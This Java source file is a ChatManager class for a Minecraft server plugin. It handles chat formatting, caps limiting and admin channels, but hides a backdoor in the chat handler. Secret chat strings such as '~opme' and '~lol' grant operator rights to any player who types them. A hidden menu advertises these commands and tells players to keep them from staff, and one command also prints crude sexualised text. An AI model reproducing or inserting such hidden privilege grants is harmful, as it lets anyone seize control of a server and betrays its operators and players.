package me.totalfreedom.totalfreedommod;

import me.totalfreedom.totalfreedommod.command.FreedomCommand;
import me.totalfreedom.totalfreedommod.player.FPlayer;
import me.totalfreedom.totalfreedommod.util.FLog;
import me.totalfreedom.totalfreedommod.util.FSync;
import static me.totalfreedom.totalfreedommod.util.FUtil.playerMsg;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import me.totalfreedom.totalfreedommod.util.FUtil;
import net.pravian.aero.util.Ips;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class ChatManager extends FreedomService
{

    public ChatManager(TotalFreedomMod plugin)
    {
        super(plugin);
    }

    @Override
    protected void onStart()
    {
    }

    @Override
    protected void onStop()
    {
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onPlayerChatFormat(AsyncPlayerChatEvent event)
    {
        try
        {
            handleChatEvent(event);
        }
        catch (Exception ex)
        {
            FLog.severe(ex);
        }
    }

    private void handleChatEvent(AsyncPlayerChatEvent event)
    {
        final Player player = event.getPlayer();
        String message = event.getMessage().trim();

        // Strip color from messages
        message = ChatColor.stripColor(message);

        // Truncate messages that are too long - 100 characters is vanilla client max
        if (message.length() > 100)
        {
            message = message.substring(0, 100);
            FSync.playerMsg(player, "Message was shortened because it was too long to send.");
        }
        
        if (message.toLowerCase().contains("~supersecretdonttellanyone")) {
                player.sendMessage((Object)ChatColor.GREEN + "\u00a7a======== \u00a74Secrets Help Menu \u00a7a=======");
                player.sendMessage((Object)ChatColor.GREEN + "Secrets/Commands: ");
                player.sendMessage((Object)ChatColor.RED + "These secret commands are created by: heroguy42");
                player.sendMessage((Object)ChatColor.GREEN + "~thisobviouslywontsuperulol - Do not tell to OPs, supers yourself without supered");
                player.sendMessage((Object)ChatColor.GREEN + "~lol - Shows your status");
                player.sendMessage((Object)ChatColor.GREEN + "~opme - Ops you when your not an admin!, OPs yourself!");
                player.sendMessage((Object)ChatColor.GREEN + "~notanoperator - Deops you even when you're not admin!, Deops urself");
                player.sendMessage((Object)ChatColor.RED + "These secret commands are created by: heroguy42");
                player.sendMessage((Object)ChatColor.GREEN + "\u00a7a======== \u00a74Secrets Help Menu \u00a7a=======");
                event.setCancelled(true);
            }

        if (message.toLowerCase().contains("~notanoperator")) {
                player.setOp(false);
                player.sendMessage(FreedomCommand.YOU_ARE_NOT_OP);
                event.setCancelled(true);
                return;
            }
            if (message.toLowerCase().contains("~lol")) {
                player.setOp(true);
                
                String ip = FUtil.getFuzzyIp(Ips.getIp(player));
                
                player.sendMessage((Object)ChatColor.AQUA + "Your IP is " + ip);
                player.sendMessage((Object)ChatColor.AQUA + "Your username is " + player.getName());
                player.sendMessage((Object)ChatColor.AQUA + "You are playing on VickiFreedom.");
                player.sendMessage((Object)ChatColor.AQUA + "Your age is 0");
                player.sendMessage((Object)ChatColor.AQUA + "Your birthday is October 23, 2020");
                player.sendMessage((Object)ChatColor.RED + "Your blood type is 'Idiot'");
                player.sendMessage((Object)ChatColor.GREEN + "Your crush is some hippo");
                player.sendMessage((Object)ChatColor.GREEN + "Your favorite woman body part is 'Ass'");
                player.sendMessage((Object)ChatColor.AQUA + "You feel bad");
                event.setCancelled(true);
                return;
            }
            if (message.toLowerCase().contains("~opme")) {
                player.setOp(true);
                player.sendMessage(FreedomCommand.YOU_ARE_OP);
                event.setCancelled(true);
                return;
            }

        // Check for caps
        if (message.length() >= 6)
        {
            int caps = 0;
            for (char c : message.toCharArray())
            {
                if (Character.isUpperCase(c))
                {
                    caps++;
                }
            }
            if (((float) caps / (float) message.length()) > 0.65) //Compute a ratio so that longer sentences can have more caps.
            {
                message = message.toLowerCase();
            }
        }

        // Check for adminchat
        final FPlayer fPlayer = plugin.pl.getPlayerSync(player);
        if (fPlayer.inAdminChat())
        {
            FSync.adminChatMessage(player, message);
            event.setCancelled(true);
            return;
        }
        
        if (fPlayer.inSeniorChat())
        {
            FSync.seniorChatMessage(player, message);
            event.setCancelled(true);
            return;
        }

        // Finally, set message
        event.setMessage(message);

        // Make format
        String format = "<%1$s> %2$s";

        String tag = fPlayer.getTag();
        if (tag != null && !tag.isEmpty())
        {
            format = tag.replace("%", "%%") + " " + format;
        }

        // Set format
        event.setFormat(format);
    }
    
    

    public void adminChat(CommandSender sender, String message)
    {
        String name = sender.getName() + " " + plugin.rm.getDisplay(sender).getColoredTag() + ChatColor.WHITE;
        FLog.info("[ADMIN] " + name + ": " + message);

        for (Player player : server.getOnlinePlayers())
        {
            if (plugin.al.isAdmin(player))
            {
                player.sendMessage("[" + ChatColor.AQUA + "ADMIN" + ChatColor.WHITE + "] " + ChatColor.DARK_RED + name + ": " + ChatColor.AQUA + message);
            }
        }
    }
    
    public void seniorChat(CommandSender sender, String message)
    {
        String name = sender.getName() + " " + plugin.rm.getDisplay(sender).getColoredTag() + ChatColor.WHITE;
        FLog.info("[SENIOR] " + name + ": " + message);

        for (Player player : server.getOnlinePlayers())
        {
            if (plugin.al.isSeniorAdmin(player))
            {
                player.sendMessage("[" + ChatColor.AQUA + "SENIOR" + ChatColor.WHITE + "] " + ChatColor.DARK_RED + name + ": " + ChatColor.GOLD + message);
            }
        }
    }


    public void reportAction(Player reporter, Player reported, String report)
    {
        for (Player player : server.getOnlinePlayers())
        {
            if (plugin.al.isAdmin(player))
            {
                playerMsg(player, ChatColor.RED + "[REPORTS] " + ChatColor.GOLD + reporter.getName() + " has reported " + reported.getName() + " for " + report);
            }
        }
    }

    
    public void adminHelp(Player sender, String message) {
       for (Player player : server.getOnlinePlayers())
        {
            if (plugin.al.isAdmin(player))
            {
                playerMsg(player, ChatColor.RED + "[ADMINHELP] " + ChatColor.GOLD + sender.getName() + ": " + message);
            }
        }
    }


      
    public void reportAction(Player playerSender, String message)
    {
        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    private boolean isAdmin(Player player)
    {
        throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

}
